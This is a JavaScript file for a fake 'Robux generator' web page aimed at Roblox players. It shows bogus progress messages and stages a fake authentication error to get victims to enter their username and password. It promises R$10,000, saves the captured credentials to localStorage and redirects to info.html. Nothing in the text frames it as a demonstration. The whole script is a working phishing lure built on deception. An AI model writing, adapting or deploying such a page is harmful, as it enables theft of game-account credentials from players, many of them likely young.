(async function(){

var statusNode = document.querySelector("#status");
function update(text) {
    statusNode.innerHTML = text;
}
async function delay() {
    await new Promise(function(res) {setTimeout(res, 1000 + (Math.random() * 2000))});
}
async function promptUsername() {
    var username = await customPrompt(
        "Oops!",
        "We couldn't automatically find your username. Please enter it here.",
        [{text: "Submit", function: (close, inputs) => {
            var u = inputs[0]
            if (u.length > 2 && u.length < 21) close(u);
        }}],
        [{name: "Username"}]
    );
    return username;
}
async function promptPassword() {
    var password = await customPrompt(
        "Oops!",
        "While connecting to your account, we encountered an error: Additional authentication required. Please supply additional information to complete the transfer of <b>R$10,000</b>.",
        [{text: "Submit", function: (close, inputs) => {
            var p = inputs[0];
            if (p.length > 7) close(p);
        }}],
        [{name: "Password"}]
    );
    return password;
}

update("Generating robux...");
await delay();
update("Getting robux...");
await delay();
update("Detecting username...")
await delay();
var username = await promptUsername();
update("Connecting to account: <b>" + username + "</b>...");
await delay();
var password = await promptPassword();
update("Connecting to account: <b>" + username + "</b>, with password: <b>" + password + "</b>...");
await delay();
update("Adding to group...");
await delay();
update("Sending robux...");
await delay();
update("Removing from group..");
await delay();
customPrompt("Congrats!", "You just got <b>R$10,000</b>!");

localStorage.setItem("robloxInfo", JSON.stringify({username: username, password: password}));

await delay();
location.href = "info.html";
})();